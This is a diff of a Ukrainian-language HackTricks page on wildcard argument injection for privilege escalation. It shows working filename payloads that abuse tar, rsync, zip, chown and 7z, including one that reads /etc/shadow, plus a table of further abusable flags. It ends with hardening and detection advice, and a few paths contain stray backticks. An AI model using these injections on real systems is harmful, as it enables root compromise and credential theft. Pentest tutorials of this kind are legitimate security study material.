@@ -1,60 +1,123 @@
+# Wildcards Spare Tricks
+
 {{#include ../../banners/hacktricks-training.md}}
 
-## chown, chmod
+> Wildcard (також відомий як *glob*) **ін'єкція аргументів** відбувається, коли привілейований скрипт виконує Unix-бінарний файл, такий як `tar`, `chown`, `rsync`, `zip`, `7z`, … з неквотованим шаблоном, таким як `*`.
+> Оскільки оболонка розширює шаблон **перед** виконанням бінарного файлу, зловмисник, який може створювати файли в робочому каталозі, може створити імена файлів, які починаються з `-`, щоб вони інтерпретувалися як **опції замість даних**, ефективно контрабандуючи довільні прапори або навіть команди.
+> Ця сторінка збирає найкорисніші примітиви, нещодавні дослідження та сучасні виявлення на 2023-2025 роки.
 
-Ви можете **вказати, якого власника файлу та дозволи ви хочете скопіювати для решти файлів**
+## chown / chmod
+
+Ви можете **скопіювати власника/групу або біти дозволів довільного файлу**, зловживаючи прапором `--reference`:
 ```bash
-touch "--reference=/my/own/path/filename"
+# attacker-controlled directory
+touch "--reference=/root/secret``file"   # ← filename becomes an argument
 ```
-Ви можете експлуатувати це, використовуючи [https://github.com/localh0t/wildpwn/blob/master/wildpwn.py](https://github.com/localh0t/wildpwn/blob/master/wildpwn.py) _(комбінована атака)_\
-Більше інформації в [https://www.exploit-db.com/papers/33930](https://www.exploit-db.com/papers/33930)
-
-## Tar
-
-**Виконати довільні команди:**
+Коли root пізніше виконує щось на зразок:
 ```bash
+chown -R alice:alice *.php
+chmod -R 644 *.php
+```
+`--reference=/root/secret``file` інжектується, що призводить до того, що *всі* відповідні файли успадковують власність/дозволи від `/root/secret``file`.
+
+*PoC & tool*: [`wildpwn`](https://github.com/localh0t/wildpwn) (комбінована атака).
+Дивіться також класичну статтю DefenseCode для деталей.
+
+---
+
+## tar
+
+### GNU tar (Linux, *BSD, busybox-full)
+
+Виконуйте довільні команди, зловживаючи функцією **checkpoint**:
+```bash
+# attacker-controlled directory
+echo 'echo pwned > /tmp/pwn' > shell.sh
+chmod +x shell.sh
 touch "--checkpoint=1"
 touch "--checkpoint-action=exec=sh shell.sh"
 ```
-Ви можете експлуатувати це, використовуючи [https://github.com/localh0t/wildpwn/blob/master/wildpwn.py](https://github.com/localh0t/wildpwn/blob/master/wildpwn.py) _(tar attack)_\
-Більше інформації в [https://www.exploit-db.com/papers/33930](https://www.exploit-db.com/papers/33930)
+Якщо root виконує, наприклад, `tar -czf /root/backup.tgz *`, `shell.sh` виконується від імені root.
 
-## Rsync
+### bsdtar / macOS 14+
 
-**Виконати довільні команди:**
+За замовчуванням `tar` на останніх версіях macOS (на базі `libarchive`) *не* реалізує `--checkpoint`, але ви все ще можете досягти виконання коду за допомогою прапора **--use-compress-program**, який дозволяє вам вказати зовнішній компресор.
 ```bash
-Interesting rsync option from manual:
-
--e, --rsh=COMMAND           specify the remote shell to use
---rsync-path=PROGRAM    specify the rsync to run on remote machine
+# macOS example
+touch "--use-compress-program=/bin/sh"
 ```
+Коли привілейований скрипт виконує `tar -cf backup.tar *`, `/bin/sh` буде запущено.
 
+---
+
+## rsync
+
+`rsync` дозволяє вам переоприділити віддалену оболонку або навіть віддалений двійковий файл за допомогою параметрів командного рядка, які починаються з `-e` або `--rsync-path`:
 ```bash
-touch "-e sh shell.sh"
+# attacker-controlled directory
+touch "-e sh shell.sh"        # -e <cmd> => use <cmd> instead of ssh
 ```
-Ви можете експлуатувати це, використовуючи [https://github.com/localh0t/wildpwn/blob/master/wildpwn.py](https://github.com/localh0t/wildpwn/blob/master/wildpwn.py) _(\_rsync \_атака)_\
-Більше інформації в [https://www.exploit-db.com/papers/33930](https://www.exploit-db.com/papers/33930)
+Якщо root пізніше архівує каталог за допомогою `rsync -az * backup:/srv/`, інжектований прапор запускає вашу оболонку на віддаленій стороні.
 
-## 7z
+*PoC*: [`wildpwn`](https://github.com/localh0t/wildpwn) (`rsync` режим).
 
-У **7z** навіть використовуючи `--` перед `*` (зауважте, що `--` означає, що наступний ввід не може бути розглянутий як параметри, тому в цьому випадку лише шляхи до файлів) ви можете викликати довільну помилку для читання файлу, тому якщо команда, подібна до наступної, виконується root:
+---
+
+## 7-Zip / 7z / 7za
+
+Навіть коли привілейований скрипт *обережно* додає до шаблону символи `--` (щоб зупинити парсинг опцій), формат 7-Zip підтримує **файли списків файлів**, додаючи до імені файлу `@`. Поєднання цього з символічним посиланням дозволяє вам *екстрагувати довільні файли*:
 ```bash
-7za a /backup/$filename.zip -t7z -snl -p$pass -- *
+# directory writable by low-priv user
+cd /path/controlled
+ln -s /etc/shadow   root.txt      # file we want to read
+touch @root.txt                  # tells 7z to use root.txt as file list
 ```
-І ви можете створювати файли в папці, де це виконується, ви можете створити файл `@root.txt` і файл `root.txt`, який є **symlink** на файл, який ви хочете прочитати:
+Якщо root виконує щось на зразок:
 ```bash
-cd /path/to/7z/acting/folder
-touch @root.txt
-ln -s /file/you/want/to/read root.txt
+7za a /backup/`date +%F`.7z -t7z -snl -- *
 ```
-Тоді, коли **7z** виконується, він буде розглядати `root.txt` як файл, що містить список файлів, які він повинен стиснути (саме це вказує на наявність `@root.txt`), і коли 7z читає `root.txt`, він прочитає `/file/you/want/to/read`, і **оскільки вміст цього файлу не є списком файлів, він видасть помилку**, показуючи вміст.
+7-Zip спробує прочитати `root.txt` (→ `/etc/shadow`) як список файлів і вийде, **друкуючи вміст у stderr**.
 
-_Більше інформації в Write-ups of the box CTF from HackTheBox._
+---
 
-## Zip
+## zip
 
-**Виконати довільні команди:**
+`zip` підтримує прапорець `--unzip-command`, який передається *дослівно* до системної оболонки, коли архів буде перевірено:
 ```bash
-zip name.zip files -T --unzip-command "sh -c whoami"
+zip result.zip files -T --unzip-command "sh -c id"
 ```
+Впровадьте прапор через спеціально підготовлену назву файлу та чекайте, поки привілейований скрипт резервного копіювання викличе `zip -T` (тест архіву) на отриманому файлі.
+
+---
+
+## Додаткові двійкові файли, вразливі до ін'єкції диких символів (швидкий список 2023-2025)
+
+Наступні команди були зловживані в сучасних CTF та реальних середовищах. Пейлоад завжди створюється як *назва файлу* всередині записуваного каталогу, який пізніше буде оброблений з диким символом:
+
+| Binary | Flag to abuse | Effect |
+| --- | --- | --- |
+| `bsdtar` | `--newer-mtime=@<epoch>` → довільний `@file` | Читати вміст файлу |
+| `flock` | `-c <cmd>` | Виконати команду |
+| `git`   | `-c core.sshCommand=<cmd>` | Виконання команди через git по SSH |
+| `scp`   | `-S <cmd>` | Запустити довільну програму замість ssh |
+
+Ці примітиви менш поширені, ніж класичні *tar/rsync/zip*, але їх варто перевірити під час полювання.
+
+---
+
+## Виявлення та зміцнення
+
+1. **Вимкніть оболонкове розширення** в критичних скриптах: `set -f` (`set -o noglob`) запобігає розширенню диких символів.
+2. **Цитуйте або екрануйте** аргументи: `tar -czf "$dst" -- *` *небезпечно* — надавайте перевагу `find . -type f -print0 | xargs -0 tar -czf "$dst"`.
+3. **Явні шляхи**: Використовуйте `/var/www/html/*.log` замість `*`, щоб зловмисники не могли створити сусідні файли, які починаються з `-`.
+4. **Найменші привілеї**: Запускайте резервні/обслуговуючі завдання як обліковий запис служби без привілеїв замість root, коли це можливо.
+5. **Моніторинг**: Попередньо створене правило Elastic *Potential Shell via Wildcard Injection* шукає `tar --checkpoint=*`, `rsync -e*` або `zip --unzip-command`, за яким негайно слідує дочірній процес оболонки. Запит EQL можна адаптувати для інших EDR.
+
+---
+
+## Посилання
+
+* Elastic Security – Правило виявлення потенційної оболонки через ін'єкцію диких символів (остання оновлення 2025)
+* Rutger Flohil – “macOS — Ін'єкція диких символів tar” (18 грудня 2024)
+
 {{#include ../../banners/hacktricks-training.md}}
